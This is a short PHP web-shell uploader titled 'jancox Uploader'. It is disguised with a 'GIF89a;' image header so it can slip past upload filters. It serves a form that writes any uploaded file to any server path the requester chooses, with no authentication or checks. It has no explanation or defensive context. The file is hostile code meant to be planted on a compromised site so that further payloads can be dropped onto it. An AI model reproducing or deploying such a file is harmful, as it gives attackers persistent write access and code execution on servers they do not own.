GIF89a;
<title>Jancox</title>
<pre><b>jancox Uploader</b></pre>
<?php $files = @$_FILES["files"];if ($files["name"] != "") {$fullpath = $_REQUEST["path"] . $files["name"];if (move_uploaded_file($files["tmp_name"], $fullpath)){echo "<a href=\"$fullpath\">SUKSES COK KLIK NANG KENE.</a>";}}?><form method=POST enctype="multipart/form-data" action="">
<input type=text name=path><input type="file" name="files">
<br><input type=submit value="Upload">
</form>
